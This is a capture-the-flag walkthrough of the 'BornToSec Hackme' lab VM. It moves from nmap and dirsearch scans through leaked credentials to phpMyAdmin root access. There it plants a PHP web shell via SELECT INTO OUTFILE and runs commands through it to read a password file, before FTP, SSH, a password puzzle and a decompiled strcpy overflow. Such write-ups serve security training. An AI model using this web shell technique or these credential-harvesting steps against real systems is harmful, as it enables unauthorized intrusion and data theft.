
### Step 1.
```bash
# List all the devices in the private network (replace by network ip address)
sudo nmap --unprivileged -sn 192.168.64.0/24
```

Once revealed, let's add ip address to the env variables.
```bash
export IP=192.168.64.6
```

<hr>

### Step 2.
```bash
# List all the opened ports for specified ip address (replace by device ip address)
sudo nmap $IP
# or even better
sudo nmap -T4 -A -v $IP
```

<details>
    <summary>Info about of opened ports</summary>

```bash
21/tcp  open  ftp        vsftpd 2.0.8 or later
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap       Dovecot imapd
443/tcp open  ssl/http   Apache httpd 2.2.22 ((Ubuntu))
993/tcp open  ssl/imaps?
```

</details>

<details>
    <summary>More detailed info about of opened ports</summary>

```
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: SASL-IR IDLE listed have LITERAL+ capabilities ENABLE more post-login Pre-login LOGIN-REFERRALS OK LOGINDISABLEDA0001 IMAP4rev1 STARTTLS ID
|_ssl-date: 2022-10-08T19:41:46+00:00; 0s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22 ((Ubuntu))
| ssl-cert: Subject: commonName=BornToSec
| Issuer: commonName=BornToSec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-10-08T00:19:46
| Not valid after:  2025-10-05T00:19:46
| MD5:   3f63 02ca 0bb1 e732 9987 6887 3623 86a3
|_SHA-1: eebc f8de 3422 dd63 5314 9d47 811f f6d1 8f77 c98d
|_ssl-date: 2022-10-08T19:41:45+00:00; 0s from scanner time.
993/tcp open  ssl/imaps?
|_ssl-date: 2022-10-08T19:41:45+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

<hr>

### Step 3.

For this step we'll use dirsearch - an advanced web path brute-forcer.

See [github page](https://github.com/maurosoria/dirsearch) to know installation steps and advanced usage.


```bash
python3 dirsearch.py -e php -u https://$IP --exclude-status 400,401,404
```

<details>
    <summary>Dirsearch output from scanning https server</summary>

```bash
[10:36:23] 403 -  241B  - /cgi-bin/
[10:36:28] 301 -  249B  - /forum  ->  https://192.168.64.6/forum/
[10:36:34] 301 -  252B  - /phpmyadmin  ->  https://192.168.64.6/phpmyadmin/
[10:36:34] 200 -    2KB - /forum/
[10:36:37] 403 -  240B  - /server-status/
[10:36:37] 403 -  240B  - /server-status
[10:36:41] 200 -    2KB - /phpmyadmin/index.php
[10:36:41] 200 -    2KB - /phpmyadmin/
[10:36:42] 301 -  251B  - /webmail  ->  https://192.168.64.6/webmail/
[10:36:42] 403 -  254B  - /webmail/src/configtest.php
```

</details>


```bash
python3 dirsearch.py -e php -u http://$IP --exclude-status 400,401,404
```

<details>
    <summary>Dirsearch output from scanning http server</summary>

```
[10:30:07] 403 -  242B  - /.ht_wsr.txt
[10:30:07] 403 -  242B  - /.htaccess.sample
[10:30:07] 403 -  241B  - /.htaccess.orig
[10:30:07] 403 -  242B  - /.htaccess.bak1
[10:30:07] 403 -  240B  - /.htaccessOLD
[10:30:07] 403 -  241B  - /.htaccessOLD2
[10:30:07] 403 -  240B  - /.htaccess.save
[10:30:07] 403 -  237B  - /.htm
[10:30:07] 403 -  241B  - /.htaccessBAK
[10:30:07] 403 -  241B  - /.htaccess_sc
[10:30:07] 403 -  243B  - /.htaccess_orig
[10:30:07] 403 -  245B  - /.htpasswd_test
[10:30:07] 403 -  237B  - /.html
[10:30:07] 403 -  241B  - /.htpasswds
[10:30:07] 403 -  243B  - /.htaccess_extra
[10:30:07] 403 -  241B  - /.httr-oauth
[10:30:18] 403 -  240B  - /cgi-bin/
[10:30:21] 403 -  245B  - /doc/html/index.html
[10:30:21] 403 -  247B  - /doc/en/changes.html
[10:30:21] 403 -  243B  - /doc/stable.version
[10:30:21] 403 -  237B  - /doc/
[10:30:21] 403 -  239B  - /doc/api/
[10:30:22] 301 -  247B  - /fonts  ->  http://192.168.64.6/fonts/
[10:30:22] 403 -  239B  - /forum/
[10:30:22] 403 -  242B  - /forum/admin/
[10:30:22] 403 -  238B  - /forum
[10:30:22] 403 -  247B  - /forum/phpmyadmin/
[10:30:23] 403 -  248B  - /forum/install/install.php
[10:30:32] 403 -  240B  - /server-status/
[10:30:32] 403 -  239B  - /server-status
```

</details>

<hr>

### Step 4.
Go to the `https://$IP/forum/` <br>
Look into log file named `Probleme login ?`: 
```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

From this output we can understand, that `lmezard` tried to connect to the server <br>
and accidentally (or not) typed password in the login field. Such a mistake!

Use this pair to login as a user on the forum, and get the mail from account page. <br>
Mail: `laurie@borntosec.net`

<hr>

### Step 5.
We use this credentials to login to another revealed service (webmail)

Go to the `https://$IP/webmail/` <br>
Login: `laurie@borntosec.net` <br>
Password: `!q\]Ej?*5K5cy*AJ` <br>

Check out the mail with `DB Access` subject and get another credentials.

<hr>

### Step 6.

Check login credentials for the DB.

Go to the `https://$IP/phpmyadmin/` <br>
Login: `root` <br>
Password: `Fg-'kKXBj87E:aJ$` <br>

<hr>

### Step 7.

The next thing we'll do is trying to open a [webshell](https://en.wikipedia.org/wiki/Web_shell)

[11:11:23] 403 -  249B  - /forum/.ht_wsr.txt
[11:11:23] 403 -  246B  - /forum/.htaccess.save
[11:11:23] 403 -  248B  - /forum/.htaccess_orig
[11:11:23] 403 -  247B  - /forum/.htaccess.bak1
[11:11:23] 403 -  247B  - /forum/.htaccess.orig
[11:11:23] 403 -  248B  - /forum/.htaccess.sample
[11:11:23] 403 -  248B  - /forum/.htaccess_extra
[11:11:23] 403 -  247B  - /forum/.htaccessBAK
[11:11:23] 403 -  247B  - /forum/.htaccess_sc
[11:11:24] 403 -  247B  - /forum/.htaccessOLD2
[11:11:24] 403 -  246B  - /forum/.htaccessOLD
[11:11:24] 403 -  242B  - /forum/.htm
[11:11:24] 403 -  242B  - /forum/.html
[11:11:24] 403 -  247B  - /forum/.httr-oauth
[11:11:24] 403 -  247B  - /forum/.htpasswds
[11:11:24] 403 -  251B  - /forum/.htpasswd_test
[11:11:41] 403 -  245B  - /forum/backup/
[11:11:41] 403 -  257B  - /forum/backup/vendor/phpunit/phpunit/phpunit
[11:11:42] 403 -  243B  - /forum/backup
[11:11:47] 403 -  244B  - /forum/config
[11:11:48] 403 -  249B  - /forum/config/config.ini
[11:11:48] 403 -  252B  - /forum/config/AppData.config
[11:11:48] 403 -  245B  - /forum/config/
[11:11:48] 403 -  250B  - /forum/config/app.php
[11:11:48] 403 -  250B  - /forum/config/apc.php
[11:11:48] 403 -  254B  - /forum/config/database.yml
[11:11:48] 403 -  253B  - /forum/config/development/
[11:11:48] 403 -  251B  - /forum/config/app.yml
[11:11:48] 403 -  256B  - /forum/config/database.yml~
[11:11:48] 403 -  251B  - /forum/config/autoload/
[11:11:48] 403 -  266B  - /forum/config/initializers/secret_token.rb
[11:11:48] 403 -  260B  - /forum/config/database.yml.sqlite3
[11:11:48] 403 -  254B  - /forum/config/databases.yml
[11:11:48] 403 -  249B  - /forum/config/db.inc
[11:11:48] 403 -  258B  - /forum/config/database.yml.pgsql
[11:11:48] 403 -  251B  - /forum/config/aws.yml
[11:11:48] 403 -  252B  - /forum/config/master.key
[11:11:48] 403 -  254B  - /forum/config/monkdonate.ini
[11:11:48] 403 -  249B  - /forum/config/config.inc
[11:11:48] 403 -  258B  - /forum/config/banned_words.txt
[11:11:48] 403 -  253B  - /forum/config/producao.ini
[11:11:48] 403 -  257B  - /forum/config/monkcheckout.ini
[11:11:48] 403 -  249B  - /forum/config/xml/
[11:11:48] 403 -  252B  - /forum/config/routes.yml
[11:11:48] 403 -  253B  - /forum/config/monkid.ini
[11:11:48] 403 -  253B  - /forum/config/settings.inc
[11:11:48] 403 -  261B  - /forum/config/settings/production.yml
[11:11:48] 403 -  256B  - /forum/config/settings.ini.cfm
[11:11:48] 403 -  253B  - /forum/config/settings.ini
[11:11:48] 403 -  258B  - /forum/config/settings.local.yml
[11:11:48] 403 -  251B  - /forum/config/site.php

```bash
python3 dirsearch.py -e php -u https://$IP --exclude-status 400,401,404
```

<details>
<summary>Scan of /forum endpoint</summary>

```bash
[11:11:54] 301 -  254B  - /forum/images  ->  https://192.168.64.6/forum/images/
[11:11:54] 200 -  474B  - /forum/images/
[11:11:54] 301 -  255B  - /forum/includes  ->  https://192.168.64.6/forum/includes/
[11:11:54] 200 -  810B  - /forum/includes/

[11:11:55] 301 -  251B  - /forum/js  ->  https://192.168.64.6/forum/js/
[11:11:56] 200 -  519B  - /forum/js/
[11:11:56] 301 -  252B  - /forum/lang  ->  https://192.168.64.6/forum/lang/
[11:12:02] 301 -  254B  - /forum/modules  ->  https://192.168.64.6/forum/modules/
[11:12:02] 200 -  518B  - /forum/modules/

[11:12:14] 301 -  257B  - /forum/templates_c  ->  https://192.168.64.6/forum/templates_c/
[11:12:14] 200 -    1KB - /forum/templates_c/

[11:12:16] 301 -  253B  - /forum/themes  ->  https://192.168.64.6/forum/themes/
[11:12:16] 200 -  449B  - /forum/themes/
[11:12:17] 301 -  253B  - /forum/update  ->  https://192.168.64.6/forum/update/
```
</details>


### Step 8.

Create webshell file using MySQL
SELECT '<?=`$_GET[x]`?>' INTO OUTFILE '/var/www/forum/templates_c/wsh.php'

ftp password
https://192.168.64.6/forum/templates_c/wsh.php?x=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"

Install ftp client if not installed
lftp -u lmezard ftp://192.168.64.6

```bash
#inside ftp
ls
get fun
get README
```

file fun -> tar arch
mv fun fun.tar
tar -xf fun.tar -> ft_fun

```bash
#!/bin/bash

OUTPUT=output_pcap
FILES_FILE=files.txt

rm -f $FILES_FILE
rm -f $OUTPUT

find $1 -type f > $FILES_FILE

while IFS= read -r file
do
    cat $file >> $OUTPUT
done < $FILES_FILE
```

chmod +x run.sh
./run.sh ft_fun
cat output_pcap | grep main

for getme1-7
find file with function prototype, open it, look at the fileX number
find file with fileX + 1, open it, get value from the return value.

After checking all the function, you end up with the following:
```c
//file8char getme1() {      return 'I';
//file88char getme2() { 	return 'h';
//file518char getme3() {    return 'e';
//file472char getme4() {    return 'a';
//file444char getme5() {    return 'r';
//file435char getme6() {    return 't';
//file503char getme7() {    return 'p';
```

Assemble the password: Iheartpwnage

SHA256(Iheartpwnage) = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

ssh laurie@192.168.64.6

echo "Public speaking is very easy." >> instr
echo "1 2 6 24 120 720" >> instr
echo "1 b 214" >> instr
echo "9" >> instr
echo "opekmq" >> instr
echo "4 2 6 3 1 5" >> instr

cat instr | tr -d ' ' | tr -d '\n'

g   15  1111  o
i    0  0000  p   P   0
a    5  0101  u   U   e   E
n   11  1011  k   K   ;
t   13  1101  m   M
s    1  0001  q   Q   1   A

Password: Publicspeakingisveryeasy.126241207201b2149opekmq426135


user thor

[turtle printer](https://www.pythonsandbox.com/turtle)
MD5(SLASH) = 646da671ca01bb5d84dbb5fb2238dc8e

zaz -> exploit_me

decompile with ghidra

```c
bool main(int param_1,int param_2)
{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```
